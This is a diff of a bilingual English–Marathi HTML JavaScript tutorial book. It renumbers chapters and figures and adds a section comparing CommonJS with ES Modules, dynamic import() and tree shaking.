+<div class="box mr">थोडक्यात: दोन्ही बाजूंनी live data → WebSocket; फक्त server कडून → SSE. Offline आणि caching → Service Worker. जुनी request रद्द करण्यासाठी AbortController.</div>
+
+<!-- ===== END OF CHAPTER 84 ===== -->
+
 <!-- PART-END 9: Browser &amp; DOM (add new chapters of this part above this line) -->
 
 <!-- ===================== PART 10: Modern JS & More ===================== -->
 <div class="part"><span class="part-no">PART 10</span>Modern JS &amp; More<small>Math · Date · Modules · ES6+ · Polyfills</small></div>
 
-<!-- ============================ CHAPTER 82 ============================ -->
-<div class="chapter">Chapter 82: The Math Object<small>PI · round · pow · sqrt · abs · ceil · floor · trunc · min/max · random · log</small></div>
-<div class="toc"><b>CHAPTER 82 INDEX</b>
+<!-- ============================ CHAPTER 85 ============================ -->
+<div class="chapter">Chapter 85: The Math Object<small>PI · round · pow · sqrt · abs · ceil · floor · trunc · min/max · random · log</small></div>
+<div class="toc"><b>CHAPTER 85 INDEX</b>
 <ol><li>What is the Math Object?</li><li>Math.PI</li><li>Math.round()</li><li>Math.pow() &amp; **</li><li>Math.sqrt()</li><li>Math.abs()</li><li>Math.ceil()</li><li>Math.floor()</li><li>Math.min() &amp; Math.max()</li><li>Math.random()</li><li>Math.trunc() &amp; Comparison</li><li>Math.log() &amp; More Methods</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Math Object</h2>
@@ -29337,7 +29944,7 @@ console.log(Math.floor(-4.9));  // -5
 <text x="462" y="40" text-anchor="middle" fill="#2c5aa0">4.1: floor → 4 · ceil → 5 · trunc → 4 · round → 4</text>
 <text x="178" y="160" text-anchor="middle" fill="#c0392b">-4.1: floor → -5 · ceil → -4 · trunc → -4 · round → -4</text>
 <text x="320" y="190" text-anchor="middle" fill="#555">floor = toward −∞ (left) · ceil = toward +∞ (right) · trunc = toward 0 · round = nearest (.5 → right)</text></g></svg>
-<div class="cap">Figure 147: floor, ceil, trunc and round on a number line, for positive and negative values.</div></div>
+<div class="cap">Figure 153: floor, ceil, trunc and round on a number line, for positive and negative values.</div></div>
 <div class="box mr">floor नेहमी डावीकडे (लहान बाजूला, −∞), ceil नेहमी उजवीकडे (मोठ्या बाजूला, +∞), trunc दशांश फक्त कापून टाकतो (0 कडे), आणि round जवळच्या integer कडे नेतो. म्हणून negative संख्यांवर floor(-4.1) = -5 आणि ceil(-4.1) = -4 येतात.</div>
 
 <h2 class="pb">9. Math.min() &amp; Math.max()</h2>
@@ -29439,11 +30046,11 @@ console.log(Math.round(1.005 * 100) / 100);  // → 1</pre>
 <tr><td>log / log10 / log2</td><td>Logarithms</td><td>log(1) = 0</td></tr></table>
 <div class="box mr">थोडक्यात: Math हा class नसलेला built-in object आहे (new Math() नाही). floor खाली, ceil वर, trunc दशांश काढतो, round जवळचा integer. negative संख्यांवर फरक दिसतो. random range साठीचे सूत्र लक्षात ठेवा. array साठी Math.max(...arr) वापरा.</div>
 
-<!-- ===== END OF CHAPTER 82 ===== -->
+<!-- ===== END OF CHAPTER 85 ===== -->
 
-<!-- ============================ CHAPTER 83 ============================ -->
-<div class="chapter">Chapter 83: The Date Object<small>Creating dates · UTC vs local · toString vs toLocaleString · get/set · Date.now/parse · date programs</small></div>
-<div class="toc"><b>CHAPTER 83 INDEX</b>
+<!-- ============================ CHAPTER 86 ============================ -->
+<div class="chapter">Chapter 86: The Date Object<small>Creating dates · UTC vs local · toString vs toLocaleString · get/set · Date.now/parse · date programs</small></div>
+<div class="toc"><b>CHAPTER 86 INDEX</b>
 <ol><li>What is the Date Object?</li><li>Ways to Create a Date</li><li>new Date() &amp; new Date(dateString)</li><li>new Date(year, month, …) &amp; new Date(ms)</li><li>toString() vs toLocaleString()</li><li>Date.now() &amp; More Constructor Rules</li><li>Get Methods</li><li>Set Methods</li><li>Time Get/Set Methods</li><li>toLocaleDateString / TimeString &amp; Date.parse()</li><li>Programs: Add Days, Difference, Live Clock</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Date Object</h2>
@@ -29728,7 +30335,7 @@ console.log(numTime);   // returns the output in milliseconds → …067000
 <rect x="440" y="140" width="190" height="60" rx="8" fill="#fff7e6" stroke="#f0a020"/><text x="535" y="162" text-anchor="middle" font-weight="bold">UTC view</text><text x="535" y="180" text-anchor="middle">getUTCHours, toISOString</text><text x="535" y="195" text-anchor="middle">(APIs, storage, JSON)</text>
 <rect x="440" y="10" width="190" height="60" rx="8" fill="#fdecec" stroke="#c0392b"/><text x="535" y="32" text-anchor="middle" font-weight="bold">traps</text><text x="535" y="50" text-anchor="middle">month 0-based · "YYYY-MM-DD" = UTC</text><text x="535" y="65" text-anchor="middle">set* mutates · overflow rolls over</text>
 <g stroke="#555" stroke-width="2"><line x1="200" y1="55" x2="250" y2="82" marker-end="url(#c99d)"/><line x1="260" y1="132" x2="200" y2="160" marker-end="url(#c99d)"/><line x1="380" y1="132" x2="440" y2="160" marker-end="url(#c99d)"/></g></g></svg>
-<div class="cap">Figure 148: A Date is one timestamp; you read it in local time or UTC, and watch out for the common traps.</div></div>
+<div class="cap">Figure 154: A Date is one timestamp; you read it in local time or UTC, and watch out for the common traps.</div></div>
 
 <h2 class="pb">11. Programs</h2>
 <div class="box mine"><div class="code-title">1. Write a function to add a specified number of days to a given date</div>
@@ -29812,11 +30419,11 @@ console.log(new Date(2024, 0, 31).setMonth(1) === new Date(2024, 2, 2).getTime()
 <tr><td>Difference</td><td>(d2 - d1) / 86400000</td></tr></table>
 <div class="box mr">थोडक्यात: Date म्हणजे 1970 पासूनचे milliseconds. महिना 0 पासून, getDay 0 = रविवार. "YYYY-MM-DD" UTC मध्ये parse होते. set* methods object बदलतात (mutate) आणि ms परत करतात. दाखवण्यासाठी toLocaleString, API साठी toISOString. Date.parse ला Date object देऊ नका, त्याने milliseconds जातात.</div>
 
-<!-- ===== END OF CHAPTER 83 ===== -->
+<!-- ===== END OF CHAPTER 86 ===== -->
 
-<!-- ============================ CHAPTER 84 ============================ -->
-<div class="chapter">Chapter 84: ES6+ Features by Version (ES2015 → ES2023)<small>What came in which year · examples · version-label corrections</small></div>
-<div class="toc"><b>CHAPTER 84 INDEX</b>
+<!-- ============================ CHAPTER 87 ============================ -->
+<div class="chapter">Chapter 87: ES6+ Features by Version (ES2015 → ES2023)<small>What came in which year · examples · version-label corrections</small></div>
+<div class="toc"><b>CHAPTER 87 INDEX</b>
 <ol><li>ES6 / ES2015</li><li>ES2016 (ES7) &amp; ES2017 (ES8)</li><li>ES2018 (ES9) &amp; ES2019 (ES10)</li><li>ES2020 (ES11): BigInt, ??, ?., allSettled</li><li>ES2021 (ES12): replaceAll, Logical Assignment, Numeric Separators</li><li>ES2022–ES2023: findLast, toSorted, toReversed, toSpliced, with</li><li>Version Cheat Sheet</li><li>Interview Questions &amp; Revision</li></ol></div>
 <div class="box def"><b>Naming:</b> since 2015 the ECMAScript spec is released every June and named by YEAR: ES6 = ES2015, ES7 = ES2016, ES8 = ES2017 … ES14 = ES2023. "ES6" is NOT a synonym for all modern JS; each later feature has its own year.
 <span class="cn">✔ your file labels later versions "ES6-2021" and "Es6-2022"; those are ES2021 (ES12) and ES2022/ES2023 (ES13/ES14). Also findLast and the toSorted/toReversed/toSpliced/with family are ES2023, not ES2022.</span><span class="cnm">2015 नंतर प्रत्येक वर्षी नवीन version येते: ES6 = 2015, ES7 = 2016 … ES14 = 2023. "ES6-2021" असे लिहिणे चुकीचे आहे; ते ES2021 (ES12) आहे.</span></div>
@@ -29960,7 +30567,7 @@ console.log('new', replaceWith)
 <text x="495" y="160">#private, at(),</text><text x="495" y="175">hasOwn</text>
 <text x="560" y="95">toSorted, with,</text><text x="560" y="80">findLast</text></g>
 <text x="320" y="215" text-anchor="middle" fill="#555">ES(N) = ES(2009 + N) after ES6 · a new edition every June</text></g></svg>
-<div class="cap">Figure 149: The ECMAScript timeline: the headline features of each yearly edition.</div></div>
+<div class="cap">Figure 155: The ECMAScript timeline: the headline features of each yearly edition.</div></div>
 
 <h2>7. Version Cheat Sheet</h2>
 <div class="box more"><table><tr><th>Edition</th><th>Key features</th></tr>
@@ -29993,12 +30600,12 @@ console.log([1, 2, 3].at(-1), "x".padEnd(3, "-"));  // → 3 x--</pre>
 <div class="ex"><ul class="pl"><li><b>What happens:</b> four output questions on ES6+ features.</li><li><b>Output:</b> 10 0, 512, true, 3 x--.</li></ul></div>
 <div class="box mr">थोडक्यात: ES6 = 2015, नंतर प्रत्येक वर्षी नवीन version. महत्त्वाचे: includes/** (2016), async/await (2017), object spread/finally (2018), flat/fromEntries (2019), ??/?./BigInt (2020), replaceAll/||=/??= (2021), #private/at (2022), toSorted/with/findLast (2023).</div>
 
-<!-- ===== END OF CHAPTER 84 ===== -->
+<!-- ===== END OF CHAPTER 87 ===== -->
 
-<!-- ============================ CHAPTER 85 ============================ -->
-<div class="chapter">Chapter 85: ES6 Modules: export &amp; import<small>Named &amp; default exports · import forms · live bindings · type="module"</small></div>
-<div class="toc"><b>CHAPTER 85 INDEX</b>
-<ol><li>What is a Module?</li><li>Why Your Demo Doesn't Run</li><li>Exporting (exportImport.js)</li><li>Importing (app.js)</li><li>Loading Modules in HTML (index.html)</li><li>Named vs Default Exports</li><li>Live Bindings &amp; Module Features</li><li>Interview Questions &amp; Revision</li></ol></div>
+<!-- ============================ CHAPTER 88 ============================ -->
+<div class="chapter">Chapter 88: ES6 Modules: export &amp; import<small>Named &amp; default exports · import forms · live bindings · type="module" · CommonJS vs ESM · dynamic import() · tree shaking</small></div>
+<div class="toc"><b>CHAPTER 88 INDEX</b>
+<ol><li>What is a Module?</li><li>Why Your Demo Doesn't Run</li><li>Exporting (exportImport.js)</li><li>Importing (app.js)</li><li>Loading Modules in HTML (index.html)</li><li>Named vs Default Exports</li><li>Live Bindings &amp; Module Features</li><li>CommonJS vs ESM, Dynamic import() &amp; Tree Shaking</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. What is a Module?</h2>
 <div class="box def"><b>Definition:</b> An ES module (ES6/ES2015) is a JS file with its own scope. Nothing in it is visible outside unless it is <code>export</code>ed, and other files get it with <code>import</code>. Modules always run in strict mode, run only once (cached) no matter how many files import them, are deferred by default in the browser, and allow top-level <code>await</code>.
@@ -30135,7 +30742,7 @@ const mod = await import("./sort.js");   // dynamic import → a Promise (lazy l
 <line x1="262" y1="95" x2="376" y2="95" stroke="#555" stroke-width="2" marker-end="url(#c55m)"/>
 <text x="320" y="62" text-anchor="middle" fill="#555">live binding</text>
 <text x="320" y="165" text-anchor="middle" fill="#555">only exported names cross the boundary; bar stays private</text></g></svg>
-<div class="cap">Figure 150: Modules: only exported names are visible to importers; imports are live, read-only bindings.</div></div>
+<div class="cap">Figure 156: Modules: only exported names are visible to importers; imports are live, read-only bindings.</div></div>
 
 <h2>6. Live Bindings &amp; Other Module Features (verified in Node)</h2>
 <div class="box more"><pre>import { message, setMessage } from "./fixed.js";
@@ -30153,7 +30760,73 @@ console.log(this);      // → undefined (module top level, strict mode)</pre>
 </ul></div>
 <div class="box mr">import केलेली value "live" असते: export करणाऱ्या file ने ती बदलली तर import करणाऱ्याला नवीन value दिसते. पण import करणारा ती थेट बदलू शकत नाही (TypeError). module एकदाच चालतो आणि सगळे importers तेच instance वापरतात.</div>
 
-<h2 class="pb">7. Interview Questions &amp; Revision</h2>
+<h2 class="pb">7. CommonJS vs ES Modules, Dynamic import() &amp; Tree Shaking</h2>
+<div class="box more"><b>Extra Details (added for interview prep):</b> these three topics are asked together very often.</div>
+<div class="box def"><b>Definition:</b> <b>CommonJS (CJS)</b> is Node's original module system: <code>require()</code> loads a file <b>synchronously at runtime</b> and returns a <b>copy</b> of <code>module.exports</code>. <b>ES Modules (ESM)</b> use <code>import</code>/<code>export</code>, which are <b>static</b> (analysed before the code runs), loaded asynchronously and give <b>live bindings</b>. <b>Dynamic <code>import()</code></b> loads an ES module on demand and returns a promise. <b>Tree shaking</b> is a bundler step that removes exports nobody imports, which is only possible because ESM imports are static.</div>
+<div class="code-title">Example A: the same module in CommonJS and ESM</div>
+<pre>// ─── CommonJS: math.cjs ───
+let count = 0;
+function inc() { count++; }
+module.exports = { count, inc };
+
+// main.cjs
+const m = require("./math.cjs");    // runs math.cjs NOW (synchronously)
+m.inc();
+console.log(m.count);               // → 0   (count was COPIED into the exports object)
+
+// ─── ESM: math.mjs ───
+export let count = 0;
+export function inc() { count++; }
+
+// main.mjs
+import { count, inc } from "./math.mjs";   // hoisted, resolved before the code runs
+inc();
+console.log(count);                         // → 1   (live binding)</pre>
+<div class="ex"><b>What happens:</b> CJS exports an object whose count property got the VALUE 0; changing the module's variable later doesn't update it. ESM imports are references to the exporter's variable.
+<br><span class="dis">⚠ In Node, a file is ESM if it ends in .mjs or package.json has "type": "module"; otherwise .js is CommonJS. require() of ESM and import of CJS have extra rules.</span></div>
+<table><tr><th></th><th>CommonJS</th><th>ES Modules</th></tr>
+<tr><td>Syntax</td><td>require / module.exports</td><td>import / export</td></tr>
+<tr><td>Loading</td><td>Synchronous, at runtime</td><td>Static, async, before running</td></tr>
+<tr><td>Exports</td><td>Value copy</td><td>Live read-only bindings</td></tr>
+<tr><td>Can be conditional</td><td>Yes: if (x) require("a")</td><td>Static import: no (use import())</td></tr>
+<tr><td>Top-level await</td><td>No</td><td>Yes</td></tr>
+<tr><td>this at top level</td><td>module.exports</td><td>undefined</td></tr>
+<tr><td>Tree-shakable</td><td>Hard</td><td>Yes</td></tr>
+<tr><td>Where</td><td>Older Node</td><td>Browsers, modern Node, bundlers</td></tr></table>
+
+<div class="code-title">Example B: dynamic import() for code splitting</div>
+<pre>button.addEventListener("click", async () =&gt; {
+  const { openEditor } = await import("./editor.js");   // downloaded only on first click
+  openEditor();
+});
+
+// conditional / computed path
+const lang = navigator.language.startsWith("hi") ? "hi" : "en";
+const { default: messages } = await import(`./i18n/${lang}.js`);</pre>
+<div class="ex"><b>What happens:</b> import() returns a promise for the module namespace object; bundlers put editor.js into a separate chunk, so the first page load is smaller (lazy loading, React.lazy works this way). It works in classic scripts and CommonJS too.
+<br><span class="adv">✅ Use for big, rarely used features (editors, charts, admin pages).</span></div>
+
+<div class="code-title">Example C: tree shaking</div>
+<pre>// utils.js
+export function used()   { return "kept"; }
+export function unused() { return "removed from the bundle"; }
+
+// app.js
+import { used } from "./utils.js";
+console.log(used());
+// → production bundle contains only used()   (unused() is "dead code" and is dropped)
+
+// ❌ prevents tree shaking:
+import * as _ from "lodash";          // CommonJS build: the whole library is bundled
+// ✅ instead:
+import debounce from "lodash-es/debounce";</pre>
+<div class="ex"><b>What happens:</b> the bundler (Webpack, Rollup, Vite/esbuild) reads the static import graph, marks which exports are used, and the minifier deletes the rest.
+<br><span class="dis">⚠ Code with side effects at the top level (e.g. modifying window) can't be removed safely; libraries mark themselves "sideEffects": false in package.json to allow it.</span></div>
+<div class="box mr">CommonJS (require) runtime ला synchronously load करतो आणि value ची copy देतो. ES Modules (import) static असतात, live binding देतात. import() गरज पडल्यावर module load करतो (code splitting). Tree shaking म्हणजे bundler न वापरलेले exports काढून टाकतो, आणि ते फक्त static ESM imports मुळे शक्य होते.</div>
+
+<h2 class="pb">8. Interview Questions &amp; Revision</h2>
+<div class="q">Q. CommonJS vs ES Modules? What is tree shaking?</div>
+<p>CJS: require at runtime, synchronous, value copies, conditional allowed. ESM: static import/export, async, live bindings, top-level await. Because ESM imports are known before running, bundlers can remove unused exports (tree shaking); use import() to lazy-load code.</p>
 <div class="q">Q1. Named export vs default export?</div>
 <p>Named: many per file, imported with the exact name in {} (can be renamed with as). Default: one per file, imported with any name and no braces. Named exports are better for tree-shaking and refactoring.</p>
 <div class="q">Q2. What is a namespace import?</div>
@@ -30186,11 +30859,11 @@ console.log(typeof c.inc);     // → function
 <tr><td>import("./m.js")</td><td>Dynamic (Promise)</td></tr></table>
 <div class="box mr">थोडक्यात: export ने बाहेर द्या, import ने घ्या. named अनेक असू शकतात आणि {} मध्ये import होतात; default एकच असतो आणि कोणत्याही नावाने import होतो. * as = सगळे एका object मध्ये. browser मध्ये type="module", path मध्ये .js, आणि server लागतो. imports live पण read-only असतात.</div>
 
-<!-- ===== END OF CHAPTER 85 ===== -->
+<!-- ===== END OF CHAPTER 88 ===== -->
 
-<!-- ============================ CHAPTER 86 ============================ -->
-<div class="chapter">Chapter 86: Polyfills I: Array Methods<small>What a polyfill is · map · filter · forEach · reduce · NEW: some, every, find, findIndex, includes, flat, Array.from</small></div>
-<div class="toc"><b>CHAPTER 86 INDEX</b>
+<!-- ============================ CHAPTER 89 ============================ -->
+<div class="chapter">Chapter 89: Polyfills I: Array Methods<small>What a polyfill is · map · filter · forEach · reduce · NEW: some, every, find, findIndex, includes, flat, Array.from</small></div>
+<div class="toc"><b>CHAPTER 89 INDEX</b>
 <ol><li>What is a Polyfill?</li><li>map() Polyfill</li><li>filter() Polyfill</li><li>forEach() Polyfill</li><li>reduce() Polyfill</li><li>NEW: some() &amp; every()</li><li>NEW: find() &amp; findIndex()</li><li>NEW: includes()</li><li>NEW: flat()</li><li>NEW: Array.from()</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. What is a Polyfill?</h2>
@@ -30478,7 +31151,7 @@ Array.myFrom(new Set([1, 1, 2]));               // [1, 2]</pre>
 <text x="70" y="126" fill="#2c5aa0">if (!(i in this)) continue;      // sparse arrays</text>
 <text x="70" y="148" fill="#2e8b57">… cb.call(thisArg, this[i], i, this) …</text>
 <text x="50" y="170">}  return /* new array | undefined | value | boolean | index */;  }</text></g></g></svg>
-<div class="cap">Figure 151: The common template behind every array-method polyfill.</div></div>
+<div class="cap">Figure 157: The common template behind every array-method polyfill.</div></div>
 
 <h2>11. Interview Questions &amp; Revision</h2>
 <div class="q">Q1. Why use a function (not an arrow) for prototype polyfills?</div>
@@ -30507,11 +31180,11 @@ console.log([1, 2, 3].reduce((a, b) =&gt; a + b, ""));       // → "123"</pre>
 <tr><td>flat</td><td>New array</td><td>Depth (default 1), recursion</td></tr></table>
 <div class="box mr">थोडक्यात: array polyfill = Array.prototype वर function, callback check, cb.call(thisArg, el, i, arr), holes skip करा, आणि native सारखाच return करा. map ने holes जपावे, reduce ने रिकाम्या array वर TypeError द्यावा. some/every/find/includes/flat हे नवीन polyfills interview साठी जोडले आहेत.</div>
 
-<!-- ===== END OF CHAPTER 86 ===== -->
+<!-- ===== END OF CHAPTER 89 ===== -->
 
-<!-- ============================ CHAPTER 87 ============================ -->
-<div class="chapter">Chapter 87: Polyfills II: call, apply, bind, once &amp; Object Helpers<small>call · apply · bind · once · NEW: Object.assign · Object.create · deepClone</small></div>
-<div class="toc"><b>CHAPTER 87 INDEX</b>
+<!-- ============================ CHAPTER 90 ============================ -->
+<div class="chapter">Chapter 90: Polyfills II: call, apply, bind, once &amp; Object Helpers<small>call · apply · bind · once · NEW: Object.assign · Object.create · deepClone</small></div>
+<div class="toc"><b>CHAPTER 90 INDEX</b>
 <ol><li>The Trick Behind call/apply/bind</li><li>call() Polyfill</li><li>apply() Polyfill</li><li>bind() Polyfill</li><li>Fixed call/apply/bind (verified)</li><li>once() Polyfill</li><li>NEW: Object.assign()</li><li>NEW: Object.create()</li><li>NEW: deepClone (structuredClone-like)</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. The Trick Behind call / apply / bind</h2>
@@ -30524,7 +31197,7 @@ console.log([1, 2, 3].reduce((a, b) =&gt; a + b, ""));       // → "123"</pre>
 <g stroke="#555" stroke-width="2"><line x1="162" y1="70" x2="236" y2="70" marker-end="url(#c64m)"/><line x1="412" y1="70" x2="486" y2="70" marker-end="url(#c64m)"/></g>
 <text x="200" y="60" text-anchor="middle" fill="#555">1 attach</text><text x="450" y="60" text-anchor="middle" fill="#555">2 call</text>
 <text x="320" y="140" text-anchor="middle" fill="#555">3 delete car[tempKey] · use a Symbol key so no real property is overwritten</text></g></svg>
-<div class="cap">Figure 152: How a call/apply polyfill sets this: attach the function to the context, call it, delete it.</div></div>
+<div class="cap">Figure 158: How a call/apply polyfill sets this: attach the function to the context, call it, delete it.</div></div>
 <div class="box mr">call/apply/bind चा polyfill: function ला थोड्या वेळासाठी context object वर property म्हणून ठेवा, मग ctx.fn() असा call करा (त्यामुळे this = ctx होतो), आणि नंतर ती property काढून टाका. call ला arguments वेगवेगळे, apply ला array मध्ये, आणि bind नवीन function परत करतो.</div>
 
 <h2 class="pb">2. Polyfill of the call() Method</h2>
@@ -30757,11 +31430,11 @@ console.log(Object.assign({}, { a: { b: 1 } }).a === Object.assign({}, { a: { b:
 <tr><td>deepClone</td><td>Recursion + WeakMap for cycles</td></tr></table>
 <div class="box mr">थोडक्यात: call/apply/bind polyfill मध्ये function ला context वर Symbol key ने ठेवून call करा आणि नंतर delete करा. bind ने नवीन function परत करा, त्याचा return विसरू नका, आणि new ला support द्या. once = closure flag. assign shallow copy करतो, deepClone recursion ने खोल copy करतो.</div>
 
-<!-- ===== END OF CHAPTER 87 ===== -->
+<!-- ===== END OF CHAPTER 90 ===== -->
 
-<!-- ============================ CHAPTER 88 ============================ -->
-<div class="chapter">Chapter 88: Polyfills III: Promise &amp; Combinators<small>Your myPromise versions · bugs found · all / allSettled / any / race · a spec-like MyPromise class</small></div>
-<div class="toc"><b>CHAPTER 88 INDEX</b>
+<!-- ============================ CHAPTER 91 ============================ -->
+<div class="chapter">Chapter 91: Polyfills III: Promise &amp; Combinators<small>Your myPromise versions · bugs found · all / allSettled / any / race · a spec-like MyPromise class</small></div>
+<div class="toc"><b>CHAPTER 91 INDEX</b>
 <ol><li>Promise Polyfill: the Idea (your notes)</li><li>Your myPromise (promisePolyfill.js) &amp; Its Bugs</li><li>The "Previous Repo" Version</li><li>Promise.all Polyfill (promiseAllPolyfill.js)</li><li>Promise.allSettled Polyfill (polyfillAllSettled.js)</li><li>Promise.any Polyfill (promiseAnyPolyfill.js)</li><li>Promise.race Polyfill (promiseRacePolyfill.js)</li><li>fullExampleOfPolyfill.js</li><li>Why These Simple Versions Are Not Real Promises</li><li>NEW: A Spec-like MyPromise Class (verified)</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Polyfill of Promise: the Idea</h2>
@@ -31579,7 +32252,7 @@ MyPromise.all([])                                      → []</pre>
 <text x="320" y="135" text-anchor="middle" fill="#555">then(onF, onR) ALWAYS returns a new promise; the handler's return value resolves it,</text>
 <text x="320" y="155" text-anchor="middle" fill="#555">a throw rejects it, and a missing handler passes the value/reason through.</text>
 <text x="320" y="185" text-anchor="middle" fill="#c0392b">combinators = loop + counter + MyPromise.resolve(p).then(…) (all: fail-fast · any: AggregateError)</text></g></svg>
-<div class="cap">Figure 153: A real promise: settle once, store handlers, run them as microtasks, and return a new promise from every then.</div></div>
+<div class="cap">Figure 159: A real promise: settle once, store handlers, run them as microtasks, and return a new promise from every then.</div></div>
 
 <h2>11. Interview Questions &amp; Revision</h2>
 <div class="q">Q1. What must a Promise polyfill guarantee?</div>
@@ -31607,10 +32280,10 @@ MyPromise.race([]).then(() =&gt; console.log("never"));   // (stays pending fore
 <tr><td>finally</td><td>Run cb, then pass the original value/reason through</td></tr></table>
 <div class="box mr">थोडक्यात: तुमच्या simple myPromise मध्ये (1) value = value self-assignment, (2) onReject = true typo, (3) any मध्ये onReject/onResolve उलटे, (4) all मध्ये reject न करणे, हे bugs होते. खऱ्या promise मध्ये state एकदाच बदलते, then नवीन promise देतो, callbacks microtask म्हणून चालतात, आणि अनेक handlers चालतात. combinators = loop + counter.</div>
 
-<!-- ===== END OF CHAPTER 88 ===== -->
+<!-- ===== END OF CHAPTER 91 ===== -->
 
-<div class="chapter">Chapter 89: Error Handling<small>try · catch · finally · throw · Error types · custom errors · error.cause · async errors · best practices</small></div>
-<div class="toc"><b>CHAPTER 89 INDEX</b>
+<div class="chapter">Chapter 92: Error Handling<small>try · catch · finally · throw · Error types · custom errors · error.cause · async errors · best practices</small></div>
+<div class="toc"><b>CHAPTER 92 INDEX</b>
 <ol><li>What is an error? Built-in error types</li><li>try...catch</li><li>finally</li><li>throw &amp; custom error classes</li><li>error.cause (ES2022) &amp; re-throwing</li><li>Errors in async code</li><li>Best practices</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. What is an error? Built-in error types</h2>
@@ -31675,7 +32348,7 @@ console.log(config.theme);                  // → dark</pre>
 <rect x="245" y="85" width="150" height="45" rx="8" fill="#fdecea" stroke="#c0392b"/><text x="320" y="106" text-anchor="middle" font-weight="bold">catch (e) { … }</text><text x="320" y="122" text-anchor="middle" font-size="11">error thrown → jump here</text>
 <rect x="480" y="40" width="150" height="50" rx="8" fill="#fff7e6" stroke="#f0a020"/><text x="555" y="62" text-anchor="middle" font-weight="bold">finally { … }</text><text x="555" y="80" text-anchor="middle" font-size="11">ALWAYS runs</text>
 <g stroke="#555"><line x1="160" y1="55" x2="245" y2="28"/><line x1="160" y1="75" x2="245" y2="107"/><line x1="395" y1="28" x2="480" y2="55"/><line x1="395" y1="107" x2="480" y2="75"/></g></g></svg>
-<div class="cap">Figure 154: try → (error? catch) → finally always runs.</div></div>
+<div class="cap">Figure 160: try → (error? catch) → finally always runs.</div></div>
 
 <h2>3. finally</h2>
 <div class="code-title">Example 5: finally runs even after return</div>
@@ -31823,10 +32496,10 @@ console.log(new TypeError("x") instanceof Error);           // → true</pre>
 <tr><td>{ cause }</td><td>Keep the original error when wrapping</td></tr></table>
 <div class="box mr">थोडक्यात: try मध्ये धोकादायक code, catch मध्ये हाताळणी, finally मध्ये cleanup. Async errors साठी await + try/catch किंवा .catch(). Custom errors extends Error ने बनवा.</div>
 
-<!-- ===== END OF CHAPTER 89 ===== -->
+<!-- ===== END OF CHAPTER 92 ===== -->
 
-<div class="chapter">Chapter 90: Iterators &amp; Generators<small>iterator protocol · function* · yield · next() · return() · throw() · yield* · infinite sequences · custom iterables · async generators</small></div>
-<div class="toc"><b>CHAPTER 90 INDEX</b>
+<div class="chapter">Chapter 93: Iterators &amp; Generators<small>iterator protocol · function* · yield · next() · return() · throw() · yield* · infinite sequences · custom iterables · async generators</small></div>
+<div class="toc"><b>CHAPTER 93 INDEX</b>
 <ol><li>The iterator protocol</li><li>Generator basics: function* and yield</li><li>Passing values into next()</li><li>yield*, return() and throw()</li><li>Practical uses: infinite IDs, custom iterables, lazy take()</li><li>Async generators &amp; for await...of</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. The iterator protocol</h2>
@@ -31859,7 +32532,7 @@ console.log(it.next());    // → { value: undefined, done: true }</pre>
 <g stroke="#f0a020" stroke-width="2"><line x1="120" y1="60" x2="170" y2="60"/><line x1="280" y1="60" x2="330" y2="60"/><line x1="440" y1="60" x2="490" y2="60"/></g>
 <g fill="#b8860b" text-anchor="middle"><text x="145" y="32">next()</text><text x="305" y="32">next()</text><text x="465" y="32">next()</text></g>
 <text x="320" y="108" text-anchor="middle" fill="#555">each next() runs to the next yield and pauses; local variables are kept</text></g></svg>
-<div class="cap">Figure 155: A generator pauses at every yield and resumes on the next next() call.</div></div>
+<div class="cap">Figure 161: A generator pauses at every yield and resumes on the next next() call.</div></div>
 
 <div class="code-title">Example 3: spread / for...of read the values</div>
 <pre>console.log([...gen()]);   // → [1, 2]</pre>
@@ -31989,10 +32662,10 @@ const [p, q] = (function* () { yield "A"; yield "B"; yield "C"; })(); console.lo
 <tr><td>async function* + for await</td><td>Async streams</td></tr></table>
 <div class="box mr">थोडक्यात: iterator = next() असलेला object; iterable = [Symbol.iterator] असलेला object; generator दोन्ही एकत्र देतो. yield थांबवतो, next() पुढे नेतो, आणि infinite sequences सुद्धा lazy असल्यामुळे सुरक्षित असतात.</div>
 
-<!-- ===== END OF CHAPTER 90 ===== -->
+<!-- ===== END OF CHAPTER 93 ===== -->
 
-<div class="chapter">Chapter 91: Memory Management &amp; Garbage Collection<small>stack vs heap · reachability · mark-and-sweep · common memory leaks · WeakMap · WeakSet · WeakRef · finding leaks in DevTools</small></div>
-<div class="toc"><b>CHAPTER 91 INDEX</b>
+<div class="chapter">Chapter 94: Memory Management &amp; Garbage Collection<small>stack vs heap · reachability · mark-and-sweep · common memory leaks · WeakMap · WeakSet · WeakRef · finding leaks in DevTools</small></div>
+<div class="toc"><b>CHAPTER 94 INDEX</b>
 <ol><li>Stack, heap &amp; reachability</li><li>Mark-and-sweep garbage collection</li><li>Common memory leaks</li><li>WeakMap, WeakSet &amp; WeakRef</li><li>Finding leaks</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Stack, heap &amp; reachability</h2>
@@ -32020,7 +32693,7 @@ a = b = null;    // the pair is unreachable from the roots → both are collecte
 <g text-anchor="middle"><text x="440" y="64">D ✖</text><text x="550" y="64">E ✖</text></g>
 <g stroke="#555"><line x1="100" y1="65" x2="168" y2="45"/><line x1="100" y1="80" x2="168" y2="105"/><line x1="212" y1="40" x2="278" y2="40"/><line x1="462" y1="55" x2="528" y2="55"/><line x1="528" y1="66" x2="462" y2="66"/></g>
 <text x="190" y="135" text-anchor="middle" fill="#27ae60">marked (reachable) → kept</text><text x="495" y="110" text-anchor="middle" fill="#c0392b">D ↔ E cycle, not reachable → swept</text></g></svg>
-<div class="cap">Figure 156: Mark-and-sweep: mark everything reachable from the roots, then free the rest (even cycles).</div></div>
+<div class="cap">Figure 162: Mark-and-sweep: mark everything reachable from the roots, then free the rest (even cycles).</div></div>
 <div class="box more"><b>Extra Details:</b> V8 also uses a <b>generational</b> heap: new objects go to a small "young generation" that is collected often and quickly (most objects die young); survivors move to the "old generation", collected less often. Collection is incremental/concurrent to avoid long pauses.</div>
 
 <h2>3. Common memory leaks</h2>
@@ -32114,16 +32787,461 @@ let x = { v: 1 }; const y = x; x = null; console.log(y.v);                      
